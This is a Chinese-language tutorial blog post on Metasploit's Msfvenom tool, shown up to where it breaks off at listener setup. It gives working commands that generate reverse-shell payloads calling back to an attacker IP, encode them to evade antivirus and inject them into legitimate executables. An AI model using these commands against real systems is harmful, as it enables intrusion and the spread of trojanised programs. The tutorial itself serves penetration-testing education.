<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Msfvenom 详解 | 1024 维度</title><meta name="author" content="TeaTang"><meta name="copyright" content="TeaTang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Msfvenom 是 Metasploit 框架中的一个强大而独立的命令行工具，它结合了 msfpayload（载荷生成器）和 msfencode（编码器）的功能，旨在生成各种格式的恶意载荷（Payload）并对其进行编码，以规避安全检测。它是渗透测试人员和红队成员创建自定义后门和绕过防御机制的利器。  核心思想：将攻击载荷（Shellcode）和输出格式（如 EXE、ELF、ASPX 等）分离">
<meta property="og:type" content="article">
<meta property="og:title" content="Msfvenom 详解">
<meta property="og:url" content="https://blog.tbf1211.xx.kg/2025/2025-01-26_Msfvenom%20%E8%AF%A6%E8%A7%A3/index.html">
<meta property="og:site_name" content="1024 维度">
<meta property="og:description" content="Msfvenom 是 Metasploit 框架中的一个强大而独立的命令行工具，它结合了 msfpayload（载荷生成器）和 msfencode（编码器）的功能，旨在生成各种格式的恶意载荷（Payload）并对其进行编码，以规避安全检测。它是渗透测试人员和红队成员创建自定义后门和绕过防御机制的利器。  核心思想：将攻击载荷（Shellcode）和输出格式（如 EXE、ELF、ASPX 等）分离">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-15.jpg">
<meta property="article:published_time" content="2025-01-25T22:24:00.000Z">
<meta property="article:modified_time" content="2025-10-30T10:10:33.518Z">
<meta property="article:author" content="TeaTang">
<meta property="article:tag" content="计算机网络">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="2025">
<meta property="article:tag" content="Metasploit">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="Msfvenom">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.tbf1211.xx.kg/img/cover/default_cover-15.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Msfvenom 详解",
  "url": "https://blog.tbf1211.xx.kg/2025/2025-01-26_Msfvenom%20%E8%AF%A6%E8%A7%A3/",
  "image": "https://blog.tbf1211.xx.kg/img/cover/default_cover-15.jpg",
  "datePublished": "2025-01-25T22:24:00.000Z",
  "dateModified": "2025-10-30T10:10:33.518Z",
  "author": [
    {
      "@type": "Person",
      "name": "TeaTang",
      "url": "https://blog.tbf1211.xx.kg"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon-1.ico"><link rel="canonical" href="https://blog.tbf1211.xx.kg/2025/2025-01-26_Msfvenom%20%E8%AF%A6%E8%A7%A3/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><meta name="google-site-verification" content="NdIUXAOVyGnnBhcrip0ksCawbdAzT0hlBZDE9u4jx6k"/><meta name="msvalidate.01" content="567E47D75E8DCF1282B9623AD914701E"/><meta name="baidu-site-verification" content="code-pE5rnuxcfD"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')

          if (theme === undefined) {
            if (mediaQueryLight.matches) activateLightMode()
            else if (mediaQueryDark.matches) activateDarkMode()
            else {
              const hour = new Date().getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            mediaQueryDark.addEventListener('change', () => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else {
            theme === 'light' ? activateLightMode() : activateDarkMode()
          }
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":true,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: TeaTang","link":"链接: ","source":"来源: 1024 维度","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Msfvenom 详解',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="preconnect" href="https://jsd.012700.xyz"><link href="/self/btf.css" rel="stylesheet"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="1024 维度" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">190</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">168</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">58</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/cover/default_cover-15.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">1024 维度</span></a><a class="nav-page-title" href="/"><span class="site-name">Msfvenom 详解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 我的轨迹</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/2023/"><i class="fa-fw fa-solid fa-bug"></i><span> 2023</span></a></li><li><a class="site-page child" href="/archives/2024/"><i class="fa-fw fa-solid fa-code"></i><span> 2024</span></a></li><li><a class="site-page child" href="/archives/2025/"><i class="fa-fw fa-solid fa-network-wired"></i><span> 2025</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo"><i class="fa-fw fas fa-comment"></i><span> 说说</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Msfvenom 详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2025-01-25T22:24:00.000Z" title="发表于 2025-01-26 06:24:00">2025-01-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="umamiPV" data-path="/2025/2025-01-26_Msfvenom%20%E8%AF%A6%E8%A7%A3/"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
<p><strong>Msfvenom</strong> 是 Metasploit 框架中的一个强大而独立的命令行工具，它结合了 <code>msfpayload</code>（载荷生成器）和 <code>msfencode</code>（编码器）的功能，旨在生成各种格式的恶意载荷（Payload）并对其进行编码，以规避安全检测。它是渗透测试人员和红队成员创建自定义后门和绕过防御机制的利器。</p>
</blockquote>
<div class="note info flat"><p>核心思想：<strong>将攻击载荷（Shellcode）和输出格式（如 EXE、ELF、ASPX 等）分离，允许用户自由组合并按需编码，生成高度定制化的恶意文件。</strong></p>
</div>
<hr>
<h2 id="一、Msfvenom-简介"><a href="#一、Msfvenom-简介" class="headerlink" title="一、Msfvenom 简介"></a>一、Msfvenom 简介</h2><h3 id="1-1-什么是-Msfvenom？"><a href="#1-1-什么是-Msfvenom？" class="headerlink" title="1.1 什么是 Msfvenom？"></a>1.1 什么是 Msfvenom？</h3><p><code>msfvenom</code> 是一个命令行工具，属于 Metasploit Framework 的一部分。它的主要功能是：</p>
<ol>
<li><strong>载荷生成 (Payload Generation)</strong>：创建各种操作系统（Windows, Linux, macOS, Android 等）和架构（x86, x64 等）的恶意载荷。</li>
<li><strong>编码 (Encoding)</strong>：对生成的载荷进行编码，以尝试绕过杀毒软件的签名检测或处理特殊字符（如 NUL <code>\x00</code>）。</li>
<li><strong>格式化 (Formatting)</strong>：将生成的载荷输出为多种文件格式，如可执行文件 (EXE, ELF)、Web Shell (ASP, JSP, PHP)、Shellcode 十六进制字符串等。</li>
</ol>
<h3 id="1-2-Msfvenom-的前身"><a href="#1-2-Msfvenom-的前身" class="headerlink" title="1.2 Msfvenom 的前身"></a>1.2 Msfvenom 的前身</h3><p>在 Msfvenom 出现之前，Metasploit 使用 <code>msfpayload</code> 和 <code>msfencode</code> 这两个独立的工具。</p>
<ul>
<li><strong><code>msfpayload</code></strong>：用于生成原始的 Shellcode。</li>
<li><strong><code>msfencode</code></strong>：用于对 <code>msfpayload</code> 生成的 Shellcode 进行编码。</li>
</ul>
<p>Msfvenom 将这两个工具的功能整合到一个单一的命令行工具中，简化了操作流程，减少了中间文件的产生。</p>
<h3 id="1-3-为什么使用-Msfvenom？"><a href="#1-3-为什么使用-Msfvenom？" class="headerlink" title="1.3 为什么使用 Msfvenom？"></a>1.3 为什么使用 Msfvenom？</h3><ul>
<li><strong>生成独立后门</strong>：无需运行 Metasploit 控制台 (<code>msfconsole</code>) 就能生成可执行的恶意文件。</li>
<li><strong>绕过检测</strong>：通过强大的编码器对 Payload 进行混淆，增加杀毒软件的检测难度。</li>
<li><strong>灵活性</strong>：支持多种 Payload 类型、编码器和输出格式，高度定制以适应不同场景。</li>
<li><strong>自动化</strong>：可以通过脚本自动生成和修改 Payload，方便在自动化渗透测试中使用。</li>
</ul>
<h2 id="二、Msfvenom-常用参数速查"><a href="#二、Msfvenom-常用参数速查" class="headerlink" title="二、Msfvenom 常用参数速查"></a>二、Msfvenom 常用参数速查</h2><p><code>msfvenom</code> 的命令行参数较多，以下是一些最核心和常用的参数：</p>
<ul>
<li><strong><code>-p, --payload &lt;payload&gt;</code></strong>：指定要使用的 Payload。例如：<code>windows/meterpreter/reverse_tcp</code>。</li>
<li><strong><code>-f, --format &lt;format&gt;</code></strong>：指定输出文件格式。例如：<code>exe</code>, <code>elf</code>, <code>raw</code>, <code>asp</code>, <code>php</code>。</li>
<li><strong><code>-o, --output &lt;file&gt;</code></strong>：指定输出文件路径和名称。</li>
<li><strong><code>-e, --encoder &lt;encoder&gt;</code></strong>：指定要使用的编码器。例如：<code>x86/shikata_ga_nai</code>。</li>
<li><strong><code>-i, --iterations &lt;count&gt;</code></strong>：指定编码的迭代次数（重复编码）。</li>
<li><strong><code>-a, --arch &lt;arch&gt;</code></strong>：指定目标架构。例如：<code>x86</code>, <code>x64</code>。</li>
<li><strong><code>-platform &lt;platform&gt;</code></strong>：指定目标平台。例如：<code>windows</code>, <code>linux</code>。</li>
<li><strong><code>-n, --nopsled &lt;length&gt;</code></strong>：为 Payload 添加 NOPs (无操作指令) 引导区。</li>
<li><strong><code>-b, --bad-chars &lt;chars&gt;</code></strong>：指定在 Payload 中不允许出现的坏字符。</li>
<li><strong><code>-x, --template &lt;template&gt;</code></strong>：指定一个合法的自定义程序作为模板，将 Payload 注入其中。</li>
<li><strong><code>-k, --keep</code></strong>：与 <code>-x</code> 结合使用时，保持模板程序的正常功能。</li>
<li><strong><code>-v, --var-name &lt;name&gt;</code></strong>：对于某些输出格式 (如 C)，指定变量名。</li>
<li><strong><code>--list-options</code></strong>：列出指定 Payload 的所有可用选项。</li>
<li><strong><code>--list &lt;type&gt;</code></strong>：列出所有可用的 <code>payloads</code>, <code>encoders</code>, <code>nops</code>, <code>platforms</code>, <code>architectures</code>, <code>formats</code>。</li>
<li><strong><code>-h, --help</code></strong>：显示帮助信息。</li>
</ul>
<h2 id="三、Msfvenom-核心概念详解"><a href="#三、Msfvenom-核心概念详解" class="headerlink" title="三、Msfvenom 核心概念详解"></a>三、Msfvenom 核心概念详解</h2><h3 id="3-1-Payload-载荷"><a href="#3-1-Payload-载荷" class="headerlink" title="3.1 Payload (载荷)"></a>3.1 Payload (载荷)</h3><p>Payload 是 <code>msfvenom</code> 生成的核心恶意代码。它们定义了在目标系统上成功利用漏洞后要执行的操作。</p>
<ul>
<li><p><strong>分类</strong>：</p>
<ul>
<li><strong>Shellcode</strong>：直接为目标架构编写的机器码，通常用于获得一个 Shell (交互式命令行)。</li>
<li><strong>Meterpreter</strong>：Metasploit 特有的高级后渗透 Shell，提供强大的功能和灵活的扩展。</li>
<li><strong>Command Shell</strong>：简单的命令行 Shell。</li>
</ul>
</li>
<li><p><strong>网络连接类型</strong>：</p>
<ul>
<li><strong>Reverse Shell (反向连接)</strong>：目标机器主动连接攻击机。这是最常用的类型，因为它可以绕过防火墙对入站连接的限制。需要指定 <code>LHOST</code> (监听主机IP) 和 <code>LPORT</code> (监听端口)。<ul>
<li>例如：<code>windows/meterpreter/reverse_tcp</code></li>
</ul>
</li>
<li><strong>Bind Shell (正向连接)</strong>：Payload 在目标机器上打开一个监听端口，等待攻击机连接。需要指定 <code>RPORT</code> (远程端口)。这种类型通常在目标机器没有防火墙或攻击机无法联系到目标机器时使用。<ul>
<li>例如：<code>windows/meterpreter/bind_tcp</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Staged vs. Stageless</strong>：</p>
<ul>
<li><strong>Staged (分阶段)</strong>：Payload 分为两部分。第一阶段（Stage 0）很小，只负责建立连接，然后下载第二阶段（Stage 1，更大的功能性 Payload，如 Meterpreter）。<ul>
<li><strong>优点</strong>：初始 Payload 小，更易于传输和隐藏；灵活，第二阶段可以在运行时确定。</li>
<li><strong>缺点</strong>：需要建立两次连接，两次传输，稳定性稍差，容易被网络流量检测。</li>
<li>例如：<code>windows/meterpreter/reverse_tcp</code> (默认就是分阶段的)</li>
</ul>
</li>
<li><strong>Stageless (非分阶段)</strong>：Payload 是一次性传输所有代码。<ul>
<li><strong>优点</strong>：稳定性更高，一次连接即可完成，适合在网络传输不稳定或需要避免多次连接的场景。</li>
<li><strong>缺点</strong>：Payload 体积较大，可能更难绕过传输时的检测。</li>
<li>例如：<code>windows/meterpreter_reverse_tcp</code> (<code>_</code> 代替 <code>/</code> 通常表示非分阶段)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-2-Encoder-编码器"><a href="#3-2-Encoder-编码器" class="headerlink" title="3.2 Encoder (编码器)"></a>3.2 Encoder (编码器)</h3><p>编码器用于对生成的 Payload 进行变换，以达到以下目的：</p>
<ol>
<li><strong>绕过签名检测</strong>：改变 Payload 的二进制特征，使其不匹配杀毒软件的数据库签名。</li>
<li><strong>坏字符处理</strong>：去除或替换 Payload 中可能导致问题（如截断）的字符，尤其是 NUL(<code>\x00</code>)、回车符(<code>\r</code>)、换行符(<code>\n</code>) 等，这在 Shellcode 注入时非常重要。</li>
</ol>
<ul>
<li><p><strong>常用编码器</strong>：</p>
<ul>
<li><strong><code>x86/shikata_ga_nai</code></strong>：经典的、效果较好的多态编码器，可以多次迭代编码，但已经相对容易被检测。</li>
<li><strong><code>x86/alpha_mixed</code></strong>：生成仅包含字母数字字符的 Shellcode。</li>
<li><strong><code>x86/call4_dword_xor</code></strong>：使用 XOR 编码。</li>
</ul>
</li>
<li><p><strong>重要提示</strong>：编码器只是一种混淆技术，<strong>不提供加密</strong>。被编码的 Payload 仍然可以被解码还原。编码器只能帮助绕过部分静态签名检测，但无法对抗行为分析和其他高级检测技术。</p>
</li>
</ul>
<h3 id="3-3-Format-输出格式"><a href="#3-3-Format-输出格式" class="headerlink" title="3.3 Format (输出格式)"></a>3.3 Format (输出格式)</h3><p><code>msfvenom</code> 支持将 Payload 输出为多种格式，以适应不同的攻击场景：</p>
<ul>
<li><strong><code>exe</code></strong>：Windows 可执行文件。</li>
<li><strong><code>elf</code></strong>：Linux 或 macOS 可执行文件。</li>
<li><strong><code>raw</code></strong>：原始 Shellcode (二进制数据)。</li>
<li><strong><code>asp</code></strong>, <strong><code>aspx</code></strong>, <strong><code>jsp</code></strong>, <strong><code>php</code></strong>：Web Shell 程序。</li>
<li><strong><code>dll</code></strong>：Windows 动态链接库。</li>
<li><strong><code>msi</code></strong>：Windows 安装程序包。</li>
<li><strong><code>c</code></strong>：C 语言格式的 Shellcode 数组，方便嵌入 C&#x2F;C++ 程序。</li>
<li><strong><code>python</code></strong>, <strong><code>perl</code></strong>, <strong><code>ruby</code></strong>：脚本语言格式的 Shellcode。</li>
</ul>
<h3 id="3-4-Template-模板文件"><a href="#3-4-Template-模板文件" class="headerlink" title="3.4 Template (模板文件)"></a>3.4 Template (模板文件)</h3><p>使用 <code>-x</code> 参数可以将生成的 Payload 注入到一个合法的程序 (模板) 中。</p>
<ul>
<li><strong>优点</strong>：生成的恶意文件看起来像一个正常的程序，可以降低用户的警惕性，并且文件头信息、数字签名（如果模板有）等都可以被保留，进一步规避检测。</li>
<li><strong><code>--keep</code> (-k) 参数</strong>：如果配合 <code>-k</code> 参数，注入 Payload 后的程序在执行恶意功能的同时，还会保留模板程序的原有功能。</li>
</ul>
<h2 id="四、Msfvenom-常见用法示例"><a href="#四、Msfvenom-常见用法示例" class="headerlink" title="四、Msfvenom 常见用法示例"></a>四、Msfvenom 常见用法示例</h2><h3 id="4-1-生成-Windows-Meterpreter-反向-TCP-Shell-EXE"><a href="#4-1-生成-Windows-Meterpreter-反向-TCP-Shell-EXE" class="headerlink" title="4.1 生成 Windows Meterpreter 反向 TCP Shell (EXE)"></a>4.1 生成 Windows Meterpreter 反向 TCP Shell (EXE)</h3><p>这是最常见的用法，生成一个 Windows 可执行文件，当执行时会尝试连接攻击机。</p>
<p><strong>攻击机 IP (LHOST)</strong>：<code>192.168.1.100</code><br><strong>监听端口 (LPORT)</strong>：<code>4444</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /root/Desktop/payload.exe</span><br></pre></td></tr></table></figure>

<h3 id="4-2-生成-Linux-x64-Meterpreter-反向-TCP-Shell-ELF"><a href="#4-2-生成-Linux-x64-Meterpreter-反向-TCP-Shell-ELF" class="headerlink" title="4.2 生成 Linux x64 Meterpreter 反向 TCP Shell (ELF)"></a>4.2 生成 Linux x64 Meterpreter 反向 TCP Shell (ELF)</h3><p>生成一个 Linux 64位可执行文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4445 -f elf -o /root/Desktop/payload.elf</span><br></pre></td></tr></table></figure>

<h3 id="4-3-生成-PHP-Reverse-Shell"><a href="#4-3-生成-PHP-Reverse-Shell" class="headerlink" title="4.3 生成 PHP Reverse Shell"></a>4.3 生成 PHP Reverse Shell</h3><p>用于 Web 服务器漏洞利用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/reverse_php LHOST=192.168.1.100 LPORT=8080 -f raw -o /var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<h3 id="4-4-生成用-Shikata-Ga-Nai-编码的-Windows-Payload"><a href="#4-4-生成用-Shikata-Ga-Nai-编码的-Windows-Payload" class="headerlink" title="4.4 生成用 Shikata Ga Nai 编码的 Windows Payload"></a>4.4 生成用 Shikata Ga Nai 编码的 Windows Payload</h3><p>使用 <code>x86/shikata_ga_nai</code> 编码器进行多次编码，减少杀软检测的几率。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /root/Desktop/encoded_payload.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>其中 <code>-i 5</code> 表示迭代编码 5 次。</li>
</ul>
<h3 id="4-5-绕过坏字符-Bad-Characters"><a href="#4-5-绕过坏字符-Bad-Characters" class="headerlink" title="4.5 绕过坏字符 (Bad Characters)"></a>4.5 绕过坏字符 (Bad Characters)</h3><p>在某些漏洞（如缓冲区溢出）中，程序可能无法正确处理某些字符。通过 <code>-b</code> 参数可以指定这些字符。</p>
<p>假设 Payload 中不能包含 <code>\x00</code> (NUL) 和 <code>\x0a</code> (LF)。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -b <span class="string">&#x27;\x00\x0a&#x27;</span> -e x86/shikata_ga_nai -o /root/Desktop/shell.bin</span><br></pre></td></tr></table></figure>

<h3 id="4-6-注入-Payload-到现有-EXE-文件"><a href="#4-6-注入-Payload-到现有-EXE-文件" class="headerlink" title="4.6 注入 Payload 到现有 EXE 文件"></a>4.6 注入 Payload 到现有 EXE 文件</h3><p>将 Payload 注入到一个名为 <code>legit_app.exe</code> 的合法程序中，并尝试保留其原有功能。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x /path/to/legit_app.exe -k -f exe -o /root/Desktop/infected_app.exe</span><br></pre></td></tr></table></figure>

<h3 id="4-7-生成-Shellcode-C-语言格式"><a href="#4-7-生成-Shellcode-C-语言格式" class="headerlink" title="4.7 生成 Shellcode (C 语言格式)"></a>4.7 生成 Shellcode (C 语言格式)</h3><p>方便在 C&#x2F;C++ 程序中直接使用。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c</span><br></pre></td></tr></table></figure>

<p><strong>输出示例：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="comment">// ... (更多 Shellcode)</span></span><br><span class="line"><span class="string">&quot;\xeb\x10\xe8\xe2\xff\xff\xff\x89\x68\x04\x89\x45\x08\x6a\x00\x6a\x00\x6a\x03\x6a\x03\x6a\x00\x31\xf6&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h2 id="五、与-Metasploit-控制台-msfconsole-配合使用"><a href="#五、与-Metasploit-控制台-msfconsole-配合使用" class="headerlink" title="五、与 Metasploit 控制台 (msfconsole) 配合使用"></a>五、与 Metasploit 控制台 (msfconsole) 配合使用</h2><p><code>msfvenom</code> 生成的 Payload 通常需要 <code>msfconsole</code> 中的监听器 (Handler) 来接收反向连接。</p>
<ol>
<li><p><strong>生成 Payload</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /root/Desktop/beacon.exe</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>配置 <code>msfconsole</code> 监听器</strong>:</p>
